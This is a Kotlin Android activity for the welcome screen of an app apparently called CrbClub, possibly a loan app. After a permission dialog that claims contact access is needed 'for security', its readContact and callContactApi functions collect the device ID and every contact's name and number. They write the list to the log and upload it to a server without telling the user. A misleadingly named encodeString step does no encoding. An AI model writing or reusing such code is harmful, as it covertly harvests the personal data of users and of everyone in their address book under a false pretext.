package com.developers.CrbClub

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.WindowManager
import androidx.annotation.NonNull
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Observer
import androidx.lifecycle.ViewModelProvider
import androidx.viewpager2.widget.ViewPager2
import com.developers.a24mpower.activities.activity.utils.MyProgressDialog
import com.developers.CrbClub.adapter.WelcomeScreenAdapter
import com.developers.CrbClub.requests.ContactRequest
import com.developers.CrbClub.utils.SharedPreferenceManager
import com.developers.CrbClub.viewmodel.ContactViewModel
import kotlinx.android.synthetic.main.activity_welcome_screen.*
import org.jetbrains.anko.startActivity
import java.util.HashMap

class WelcomeScreenActivity : AppCompatActivity() {
    var arrayOfWelcomeScreens: ArrayList<Int> = ArrayList()
    var isFirst = true
    var isRelational: Boolean? = null
    var imei1 = ""
    var contactViewModel: ContactViewModel? = null
    var isPermissionGrant: Boolean? = null
    var mDialog: MyProgressDialog? = null
    lateinit var sharedPref: SharedPreferenceManager
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )
        setContentView(R.layout.activity_welcome_screen)
        init()
    }

    private fun init() {
        mDialog = MyProgressDialog(this)
        sharedPref = SharedPreferenceManager(context = this@WelcomeScreenActivity)
        sharedPref.addString("FIRST", "TRUE")
        contactViewModel = ViewModelProvider(this).get(ContactViewModel::class.java)


        applyNowBtn.setOnClickListener {
            if (isPermissionGrant == true) {
                startActivity<DashboardActivity>()
            } else {
                checkPermissions(true)
            }
        }

        arrayOfWelcomeScreens.add(R.drawable.welcome_one)
        arrayOfWelcomeScreens.add(R.drawable.welcome_two)
        arrayOfWelcomeScreens.add(R.drawable.welcome_three)
        checkPermissions(true)
        setAdapterAndIndicator()
    }

    private fun checkPermissions(isForOpen: Boolean) {
        isRelational = false
        val permissionsRequired = ArrayList<Any>()
        val permissionsList = ArrayList<String>()
        if (!checkPermission(permissionsList, Manifest.permission.READ_CONTACTS))
            permissionsRequired.add("Read Contacts")
        if (!checkPermission(permissionsList, Manifest.permission.READ_EXTERNAL_STORAGE))
            permissionsRequired.add("Read External Storage")

        if (permissionsList.size > 0 && !isRelational!!) {
            if (permissionsRequired.size > 0) {
            }
            if (isForOpen) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    ActivityCompat.requestPermissions(
                        this,
                        permissionsList.toArray(arrayOfNulls<String>(permissionsList.size)),
                        11
                    )
                }
            }
        } else if (isRelational as Boolean) {
            if (isForOpen) {

                android.app.AlertDialog.Builder(
                    this,
                    R.style.MaterialAlertDialog_MaterialComponents_Title_Icon_CenterStacked
                )
                    .setTitle("Permission Alert")
                    .setCancelable(false)
                    .setMessage("You need to grant  permission for security. Go to permission and grant all permissions.")
                    .setPositiveButton(
                        "OK"
                    ) { dialog, which ->
                        dialog.dismiss()
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                        val uri = Uri.fromParts("package", getPackageName(), null)
                        intent.setData(uri)
                        startActivityForResult(intent, 123)
                    }.show()
            }
        } else {
            ////permission granted
            isPermissionGrant = true
            readContact()
        }
    }


    private fun checkPermission(permissionsList: ArrayList<String>, permission: String): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    permission
                ) !== PackageManager.PERMISSION_GRANTED
            ) {
                permissionsList.add(permission)
                // Check for Rationale Option
                if (!isFirst) {
                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
                        isRelational = true
                        return false
                    }
                }
            }
        }
        return true
    }

    @RequiresApi(Build.VERSION_CODES.M)
    @SuppressLint("MissingPermission")
    override fun onRequestPermissionsResult(requestCode: Int, @NonNull permissions: Array<String>, @NonNull grantResults: IntArray) {
        when (requestCode) {
            11 -> {
                val perms = HashMap<String, Int>()
                // Initial
                perms.put(
                    Manifest.permission.READ_CONTACTS,
                    PackageManager.PERMISSION_GRANTED
                )
                perms.put(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    PackageManager.PERMISSION_GRANTED
                )
                // Fill with results
                for (i in permissions.indices) {
                    perms.put(permissions[i], grantResults[i])
                }
                // Check for ACCESS_FINE_LOCATION
                if ((perms.get(Manifest.permission.READ_CONTACTS) === PackageManager.PERMISSION_GRANTED)) {
                    // All Permissions Granted
                    isPermissionGrant = true
                    readContact()
                } else {
                    // Permission Denied
                    isFirst = false
                    checkPermissions(true)
                }
            }
            else -> super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        }
    }


    private fun setAdapterAndIndicator() {
        val adapter = WelcomeScreenAdapter(this, arrayOfWelcomeScreens)
        welcomeScreenViewPager.adapter = adapter
        indicator.setViewPager2(welcomeScreenViewPager)

        welcomeScreenViewPager.registerOnPageChangeCallback(object : ViewPager2.OnPageChangeCallback() {
            override fun onPageScrolled(position: Int, positionOffset: Float, positionOffsetPixels: Int) {
                super.onPageScrolled(position, positionOffset, positionOffsetPixels)
                when(position) {
                    0-> {
                        applyNowBtn.visibility = View.GONE
                    }
                    1-> {
                        applyNowBtn.visibility = View.GONE
                    }
                    2-> {
                        applyNowBtn.visibility = View.VISIBLE
                    }
                }
            }
        })


    }

    @RequiresApi(Build.VERSION_CODES.M)
    @SuppressLint("MissingPermission")
    private fun readContact() {
        try {
            imei1 = Settings.Secure.getString(
                applicationContext.contentResolver,
                Settings.Secure.ANDROID_ID
            )

        } catch (e: Exception) {
            Log.d("LoginActivity", "Exception: $e")
        }
        var details = ""
        var name = ""
        var phoneNumber = ""
        val phones = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )
        while (phones!!.moveToNext()) {
            name =
                phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            phoneNumber =
                phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

            var numberPhone = phoneNumber.replace(" ", "")
            var replace2Number = numberPhone.replace("-", "")

            details += "$name<=@=>${replace2Number.trim()}<==>"
        }
        Log.e("LoginActivity", "Details: $details")
        encodeString(details)
    }

    private fun encodeString(details: String) {
        callContactApi(details)
    }

    private fun callContactApi(encData: String) {
        // mDialog!!.show()

        val contactRequest = ContactRequest(encData, imei1)
        contactViewModel!!.contactSend(contactRequest).observe(this, Observer {
            val status = it.error
            val message = it.message
            if (status == "0") {
                Log.e("LoginActivity", "message: $message")

            } else {
                Log.e("LoginActivity", "message: $message")
            }
            Log.e("LoginActivity", "status: $status")

            //  mDialog!!.dismiss()
        })
    }
}
